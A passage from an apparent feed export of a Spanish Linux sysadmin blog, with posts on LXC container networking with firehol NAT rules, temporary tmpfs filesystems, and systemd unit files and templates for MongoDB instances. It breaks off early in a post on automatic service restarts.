&lt;p&gt;Y para que su interfaz de red sea funcional, vamos a configurarle una dirección IP. Todo esto se hace en los ficheros habituales, teniendo en cuenta que un contenedor es una jaula, y que esta se encuentra en &lt;em&gt;/var/lib/lxc/webserver/rootfs/&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /var/lib/lxc/webserver/rootfs/etc/network/interfaces
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
    netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
    gateway &lt;span class="m"&gt;10&lt;/span&gt;.0.0.1
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El contenedor ya está funcional, y se puede levantar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-start -n webserver -d
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Supongamos que este nuevo contenedor tiene un servidor web y queremos hacerlo disponible en puerto 80 del &lt;em&gt;host&lt;/em&gt;, mediante el protocolo &lt;em&gt;NAT&lt;/em&gt;. También se necesita definir una regla de &lt;em&gt;forward&lt;/em&gt; para permitir ese tráfico. Se reinicia el servicio &lt;em&gt;firehol&lt;/em&gt; para aplicar las nuevas reglas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/firehol/firehol.conf 
dnat &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:80 proto tcp dst &lt;span class="m"&gt;192&lt;/span&gt;.168.56.4 dport &lt;span class="m"&gt;80&lt;/span&gt;

interface eth0 world
    policy drop
    protection strong
    server ssh accept
    client all accept

interface lxc0 lan
    policy drop
    client all accept

router lan2world inface lxc0 outface eth0
    masquerade
    route all accept

router world2lan inface eth0 outface lxc0
    route http accept dst &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
root@lxc:~# service firehol restart
...
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos acceder al servidor web instalado en el contenedor &lt;em&gt;webserver&lt;/em&gt; mediante el puerto 80 del &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos otro contenedor con un servidor de aplicaciones escuchando en el puerto 8080 con dirección 10.0.0.3 y pretendemos que el contenedor original haga de &lt;em&gt;proxy HTTP&lt;/em&gt;. Esta funcionalidad requiere que el contenedor &lt;em&gt;webserver&lt;/em&gt; pueda conectarse al puerto 8080 del nuevo contenedor &lt;em&gt;appserver&lt;/em&gt;. Esta regla de &lt;em&gt;forward&lt;/em&gt; aplica a todas las conexiones que inician y finalizan en el &lt;em&gt;bridge&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# cat /etc/firehol/firehol.conf 
dnat &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:80 proto tcp dst &lt;span class="m"&gt;192&lt;/span&gt;.168.56.4 dport &lt;span class="m"&gt;80&lt;/span&gt;

interface eth0 world
    policy drop
    protection strong
    server ssh accept
    client all accept

interface lxc0 lan
    policy drop
    client all accept

router lan2world inface lxc0 outface eth0
    masquerade
    route all accept

router world2lan inface eth0 outface lxc0
    route http accept dst &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2

router internal inface lxc0 outface lxc0
    route webcache accept src &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 dst &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
root@lxc:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con eso tenemos nuestro &lt;em&gt;proxy HTTP&lt;/em&gt; funcionando.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="lxc"></category><category term="bridge"></category><category term="firehol"></category></entry><entry><title>Creando sistemas de ficheros temporales con tmpfs</title><link href="http://www.linuxsysadmin.ml/2015/11/creando-sistemas-de-ficheros-temporales-con-tmpfs.html" rel="alternate"></link><published>2015-11-16T23:15:00+01:00</published><updated>2015-11-16T23:15:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-16:/2015/11/creando-sistemas-de-ficheros-temporales-con-tmpfs.html</id><summary type="html">&lt;p&gt;A veces nos podemos encontrar con un sistema de ficheros lleno que no nos permite completar alguna acción por falta de espacio en disco. En un caso así, existe la posibilidad de sacar un sistema de ficheros completo de memoria, de una forma temporal, usando el sistema de ficheros &lt;em&gt;tmpfs …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;A veces nos podemos encontrar con un sistema de ficheros lleno que no nos permite completar alguna acción por falta de espacio en disco. En un caso así, existe la posibilidad de sacar un sistema de ficheros completo de memoria, de una forma temporal, usando el sistema de ficheros &lt;em&gt;tmpfs&lt;/em&gt;. Otra opción es la de tener un sistema de ficheros temporal, en donde podamos dejar ficheros cuya persistencia no sea necesaria entre reinicios.&lt;/p&gt;
&lt;p&gt;El primer paso es tener un &lt;em&gt;punto de montaje&lt;/em&gt;, que sea la carpeta en la que se va a montar el nuevo sistema de fichero. Por ejemplo podemos usar el punto de montaje &lt;em&gt;/mnt/auxiliar&lt;/em&gt;; empezaremos creándolo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /mnt/auxiliar
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Observemos como la carpeta creada se construye sobre el mismo dispositivo que la partición raíz:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# df -h /mnt/auxiliar/
S.ficheros     Tamaño Usados  Disp Uso% Montado en
/dev/sda1        &lt;span class="m"&gt;2&lt;/span&gt;,0G   640M  &lt;span class="m"&gt;1&lt;/span&gt;,2G  &lt;span class="m"&gt;35&lt;/span&gt;% /
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando el sistema de ficheros de forma temporal&lt;/h2&gt;
&lt;p&gt;Como prueba de concepto, podemos crear este sistema de ficheros de forma temporal. En caso de no salir bien, los efectos no serían permanentes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount -o &lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;100M -t tmpfs auxiliar /mnt/auxiliar/
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver como la carpeta pertenece ahora a un sistema de ficheros nuevo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# df -h /mnt/auxiliar/
S.ficheros     Tamaño Usados  Disp Uso% Montado en
auxiliar            100M      &lt;span class="m"&gt;0&lt;/span&gt;  100M   &lt;span class="m"&gt;0&lt;/span&gt;% /mnt/auxiliar
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cuando nos cansemos del nuevo sistema de ficheros, haya cumplido con su utilidad y ya no necesitemos su contenido, la podemos desmontar; vamos a perder todos los ficheros dentro del sistema de ficheros temporal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# umount /mnt/auxiliar/
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Haciendo el cambio permanente&lt;/h2&gt;
&lt;p&gt;Si nos interesa que este sistema de fichero se &lt;em&gt;monte&lt;/em&gt; y se &lt;em&gt;desmonte&lt;/em&gt; cada vez que la máquina se inicie y se apague, basta con usar el mecanismo estándar de todo sistema de ficheros &lt;em&gt;Linux&lt;/em&gt;: el fichero &lt;em&gt;/etc/fstab&lt;/em&gt;. Basta con añadir una línea nueva con las especificaciones de este punto de montaje, por ejemplo en el final del mismo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tail -1 /etc/fstab 
auxiliar /mnt/auxiliar tmpfs &lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;100M &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con este cambio es suficiente para las sesiones venideras. En caso de querer disponer inmediatamente del sistema de ficheros podemos solicitar el montaje con un comando &lt;em&gt;mount&lt;/em&gt; normal, comando que va a usar las especificaciones del fichero &lt;em&gt;/etc/fstab&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /mnt/auxiliar
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto queda completado nuestro objetivo.&lt;/p&gt;</content><category term="linux"></category><category term="tmpfs"></category></entry><entry><title>Escribiendo units en systemd</title><link href="http://www.linuxsysadmin.ml/2015/11/escribiendo-units-en-systemd.html" rel="alternate"></link><published>2015-11-09T22:30:00+01:00</published><updated>2015-11-09T22:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-09:/2015/11/escribiendo-units-en-systemd.html</id><summary type="html">&lt;p&gt;Cuando se anunció &lt;em&gt;systemd&lt;/em&gt; me llamó la atención que además de las funciones estándares de otros sistemas de &lt;em&gt;init&lt;/em&gt; (por ejemplo &lt;em&gt;sysvinit&lt;/em&gt;), también se ofrecían otras funcionalidades normalmente delegadas a otros procesos, como por ejemplo, la posibilidad de reiniciar procesos automáticamente o de lanzar procesos temporales al estilo de &lt;em&gt;cron …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando se anunció &lt;em&gt;systemd&lt;/em&gt; me llamó la atención que además de las funciones estándares de otros sistemas de &lt;em&gt;init&lt;/em&gt; (por ejemplo &lt;em&gt;sysvinit&lt;/em&gt;), también se ofrecían otras funcionalidades normalmente delegadas a otros procesos, como por ejemplo, la posibilidad de reiniciar procesos automáticamente o de lanzar procesos temporales al estilo de &lt;em&gt;cron&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En este artículo se explica como escribir estos ficheros que rigen las tareas propias del sistema &lt;em&gt;init&lt;/em&gt; para iniciar procesos que no disponen de tales facilidades. Adicionalmente, vamos a ver como beneficiarnos del sistema de plantillas de estos mismos ficheros para evitarnos tener que repetirnos, de acuerdo con el principio &lt;a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself"&gt;DRY (don't repeat yourself)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Como ejemplo, vamos a utilizar un sistema básico de &lt;em&gt;Linux&lt;/em&gt; con &lt;em&gt;systemd&lt;/em&gt;; que podría ser &lt;em&gt;RedHat 7&lt;/em&gt;, &lt;em&gt;ArchLinux&lt;/em&gt; o &lt;em&gt;Debian 8&lt;/em&gt;. En este caso, se va a utilizar un sistema &lt;em&gt;Debian Jessie&lt;/em&gt; con una instalación básica &lt;em&gt;netinstall&lt;/em&gt; con &lt;em&gt;SSH&lt;/em&gt; y nada mas.&lt;/p&gt;
&lt;p&gt;Vamos a suponer que queremos montar un servidor con 2 instancias de &lt;em&gt;MongoDB&lt;/em&gt;, escuchando en los puertos 27001 y 27002. Empecemos con montar una estructura en &lt;em&gt;/opt/&lt;/em&gt; para contener todo lo relacionado con este despliegue. La idea es que vamos a levantar el binario &lt;em&gt;mongod&lt;/em&gt; con dos configuraciones distintas. Por eso, de momento basta con poner el binario &lt;em&gt;mongod&lt;/em&gt;, las dos configuraciones y las dos carpetas de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree /opt/
/opt/
└── mongodb
    ├── bin
    │   └── mongod
    ├── conf
    │   ├── mongo1.conf
    │   └── mongo2.conf
    ├── data
    │   ├── mongo1
    │   └── mongo2
    └── logs

&lt;span class="m"&gt;7&lt;/span&gt; directories, &lt;span class="m"&gt;3&lt;/span&gt; files
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La configuración de ambos procesos va a ser la mínima necesaria para que los procesos no entren en conflicto entre ellos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /opt/mongodb/conf/mongo1.conf 
systemLog:
    path: /opt/mongodb/logs/mongo1.log
    logAppend: &lt;span class="nb"&gt;true&lt;/span&gt;
    destination: file

net:
    port: &lt;span class="m"&gt;27001&lt;/span&gt;

storage:
    dbPath: /opt/mongodb/data/mongo1
    smallFiles: &lt;span class="nb"&gt;true&lt;/span&gt;
root@server:~# cat /opt/mongodb/conf/mongo2.conf 
systemLog:
    path: /opt/mongodb/logs/mongo2.log
    logAppend: &lt;span class="nb"&gt;true&lt;/span&gt;
    destination: file

net:
    port: &lt;span class="m"&gt;27002&lt;/span&gt;

storage:
    dbPath: /opt/mongodb/data/mongo2
    smallFiles: &lt;span class="nb"&gt;true&lt;/span&gt;
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como apunte importante, no se ha definido un archivo para guardar el &lt;em&gt;PID&lt;/em&gt; del proceso; &lt;em&gt;systemd&lt;/em&gt; no lo necesita y conoce el &lt;em&gt;PID&lt;/em&gt; de los procesos que levanta.&lt;/p&gt;
&lt;p&gt;Siguiendo las directivas de seguridad mínimas, los dos procesos &lt;em&gt;mongod&lt;/em&gt; van a levantarse con un usuario estándar que no sea &lt;em&gt;root&lt;/em&gt;. En este caso, toda la carpeta &lt;em&gt;/opt/mongodb/&lt;/em&gt; pertenece al usuario &lt;em&gt;mongo&lt;/em&gt;, aunque bastaría con la carpeta de datos y la de logs.&lt;/p&gt;
&lt;p&gt;Ponemos la definición de nuestras &lt;strong&gt;units&lt;/strong&gt; en la carpeta designada según el estándar, que es &lt;em&gt;/etc/systemd/system/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/systemd/system/mongo1.service 
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;MongoDB

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongo
&lt;span class="nv"&gt;LimitFSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitCPU&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;LimitNPROC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;ExecStartPre&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/rm -f /opt/mongodb/data/mongo1/mongod.lock
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/mongodb/bin/mongod -f /opt/mongodb/conf/mongo1.conf

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@server:~# cat /etc/systemd/system/mongo2.service 
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;MongoDB

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongo
&lt;span class="nv"&gt;LimitFSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitCPU&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;LimitNPROC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;ExecStartPre&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/rm -f /opt/mongodb/data/mongo2/mongod.lock
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/mongodb/bin/mongod -f /opt/mongodb/conf/mongo2.conf

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es especialmente interesante ver que el lenguaje de la &lt;strong&gt;units&lt;/strong&gt; de &lt;em&gt;systemd&lt;/em&gt; es declarativo, y que no son &lt;em&gt;init scripts&lt;/em&gt;; &lt;em&gt;systemd&lt;/em&gt; se encarga de todo por nosotros. Basta con declarar el comando con el que levantar el servicio y el usuario con el que hacerlo.&lt;/p&gt;
&lt;p&gt;La directiva &lt;strong&gt;WantedBy&lt;/strong&gt; indica que se tiene que levantar con el &lt;strong&gt;target&lt;/strong&gt; &lt;em&gt;multi-user&lt;/em&gt;, que es el que usa &lt;em&gt;Debian&lt;/em&gt; por defecto. Un &lt;strong&gt;target&lt;/strong&gt; viene a ser el equivalente a un &lt;em&gt;runlevel&lt;/em&gt; de &lt;em&gt;sysvinit&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Hay una directiva &lt;strong&gt;ExecStartPre&lt;/strong&gt; que se encarga de eliminar el &lt;em&gt;lock file&lt;/em&gt; de &lt;em&gt;MongoDB&lt;/em&gt; por si el proceso hubiera acabado de forma inesperada. El binario &lt;em&gt;mongod&lt;/em&gt; no levanta si este fichero existe, ya que cree que ya hay una instancia de &lt;em&gt;mongod&lt;/em&gt; usando la carpeta de datos.&lt;/p&gt;
&lt;p&gt;El resto de directivas se limitan a modificar los límites de los procesos a levantar, de acuerdo a la documentación de &lt;em&gt;MongoDB&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;A partir de ahora, son &lt;strong&gt;units&lt;/strong&gt; normales del sistema y se pueden activar e iniciar. Si ya estuvieran cargados, habría que recargar la configuración de &lt;em&gt;systemd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongo1
root@server:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongo2
root@server:~# systemctl start mongo1
root@server:~# systemctl start mongo2
root@server:~# systemctl daemon-reload
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Uso de plantillas para evitar repetirnos&lt;/h2&gt;
&lt;p&gt;Toda &lt;strong&gt;unit&lt;/strong&gt; cuyo nombre acabe en &lt;strong&gt;arroba&lt;/strong&gt; seguido por &lt;em&gt;.service&lt;/em&gt; o cualquier otro tipo de &lt;strong&gt;unit&lt;/strong&gt;, es por convención, una &lt;strong&gt;plantilla&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La idea es que vamos a crear un &lt;em&gt;link&lt;/em&gt; a la &lt;strong&gt;plantilla&lt;/strong&gt;, que ponga un texto detrás de la &lt;strong&gt;arroba&lt;/strong&gt;. Este texto va a estar disponible en la plantilla como &lt;strong&gt;%i&lt;/strong&gt;. De esta forma podemos "pasar un parámetro" a la plantilla, usando ese parámetro como diferenciador de los dos procesos.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Veamos un ejemplo:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Creamos dos &lt;em&gt;links&lt;/em&gt; a la &lt;strong&gt;plantilla&lt;/strong&gt; &lt;em&gt;mongodb@.service&lt;/em&gt;, con los nombres &lt;em&gt;mongodb@mongo1.service&lt;/em&gt; y &lt;em&gt;mongodb@mongo2.service&lt;/em&gt;, que son nuestras instancias. Estas instancias se rigen con las directivas de la &lt;strong&gt;plantilla&lt;/strong&gt;, con la variable &lt;strong&gt;%i&lt;/strong&gt; conteniendo los valores &lt;em&gt;mongo1&lt;/em&gt; y &lt;em&gt;mongo2&lt;/em&gt; respectivamente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ls -l /etc/systemd/system/mongodb&lt;span class="se"&gt;\@&lt;/span&gt;*
lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; root root  &lt;span class="m"&gt;16&lt;/span&gt; nov  &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:46 /etc/systemd/system/mongodb@mongo1.service -&amp;gt; mongodb@.service
lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; root root  &lt;span class="m"&gt;16&lt;/span&gt; nov  &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:46 /etc/systemd/system/mongodb@mongo2.service -&amp;gt; mongodb@.service
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;207&lt;/span&gt; nov  &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:45 /etc/systemd/system/mongodb@.service
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora redactamos la plantilla, teniendo en cuenta los valores que se van a cambiarse por la variable &lt;strong&gt;%i&lt;/strong&gt;, que vamos a usar para identificar el fichero de configuración de cada instancia. También es posible poner otras variables en la &lt;strong&gt;plantilla&lt;/strong&gt;, como por ejemplo, el nombre de la máquina o la versión del &lt;em&gt;kernel&lt;/em&gt; de la máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/systemd/system/mongodb&lt;span class="se"&gt;\@&lt;/span&gt;.service 
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;MongoDB

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongo
&lt;span class="nv"&gt;LimitFSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitCPU&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;LimitNPROC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;ExecStartPre&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/rm -f /opt/mongodb/data/%i/mongod.lock
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/mongodb/bin/mongod -f /opt/mongodb/conf/%i.conf

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo falta activar las instancias e iniciarlas, con los comandos habituales del demonio &lt;em&gt;systemd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongodb@mongo1
Created symlink from /etc/systemd/system/multi-user.target.wants/mongodb@mongo1.service to /etc/systemd/system/mongodb@.service.
root@server:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongodb@mongo2
Created symlink from /etc/systemd/system/multi-user.target.wants/mongodb@mongo2.service to /etc/systemd/system/mongodb@.service.
root@server:~# systemctl start mongodb@mongo1
root@server:~# systemctl start mongodb@mongo2
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto lo hemos conseguido.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="systemd"></category><category term="mongodb"></category></entry><entry><title>Restart automático de servicios con systemd</title><link href="http://www.linuxsysadmin.ml/2015/11/restart-automatico-de-servicios-con-systemd.html" rel="alternate"></link><published>2015-11-05T22:30:00+01:00</published><updated>2015-11-05T22:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-05:/2015/11/restart-automatico-de-servicios-con-systemd.html</id><summary type="html">&lt;p&gt;Cuando estamos gestionando un servidor, es posible que se caiga alguno de sus servicios. Esto es especialmente molesto cuando nos interesa tener un &lt;em&gt;uptime&lt;/em&gt; elevado. Para conseguirlo, se han utilizado diferentes maneras, desde poner personas a monitorizar en modo 24x7 hasta herramientas auxiliares como gestores tipo &lt;em&gt;runit&lt;/em&gt;, &lt;em&gt;supervisor&lt;/em&gt; o &lt;em&gt;monit …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando estamos gestionando un servidor, es posible que se caiga alguno de sus servicios. Esto es especialmente molesto cuando nos interesa tener un &lt;em&gt;uptime&lt;/em&gt; elevado. Para conseguirlo, se han utilizado diferentes maneras, desde poner personas a monitorizar en modo 24x7 hasta herramientas auxiliares como gestores tipo &lt;em&gt;runit&lt;/em&gt;, &lt;em&gt;supervisor&lt;/em&gt; o &lt;em&gt;monit&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Con la entrada en escena de &lt;em&gt;systemd&lt;/em&gt; en la mayoría de distribuciones grandes de &lt;em&gt;linux&lt;/em&gt; este problema se ha acabado; el mismo proceso que hace de &lt;strong&gt;init&lt;/strong&gt; puede encargarse de mantener los procesos levantados, y reiniciarlos en caso de caída.&lt;/p&gt;
&lt;p&gt;En este tutorial pretendo hacer que un servicio estándar se vea beneficiado de un &lt;strong&gt;override&lt;/strong&gt;, que permita el inicio automático de un servicio cuando se cae, sin tener que reescribir la &lt;strong&gt;unit&lt;/strong&gt; que se encarga del servicio o proceso.&lt;/p&gt;
&lt;p&gt;Partimos de un servidor básico &lt;em&gt;Linux&lt;/em&gt; con &lt;em&gt;systemd&lt;/em&gt;. En este caso vamos a utilizar la última versión estable de &lt;em&gt;Debian&lt;/em&gt;, a la que le vamos a instalar un servicio estándar como &lt;em&gt;nginx&lt;/em&gt; que nos va a servir como conejillo de indias.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install nginx-light
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Procedimiento&lt;/h2&gt;
&lt;p&gt;Como comprobación previa, observemos como este &lt;strong&gt;restart&lt;/strong&gt; automático no funciona; tenemos el servicio en ejecución, lo matamos y observamos que no se levanta de nuevo, por mucho que esperemos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;685&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2240&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;662&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.7   &lt;span class="m"&gt;6356&lt;/span&gt;  &lt;span class="m"&gt;1856&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00 nginx: master process /usr/sbin/nginx -g daemon on&lt;span class="p"&gt;;&lt;/span&gt; master_process on&lt;span class="p"&gt;;&lt;/span&gt;
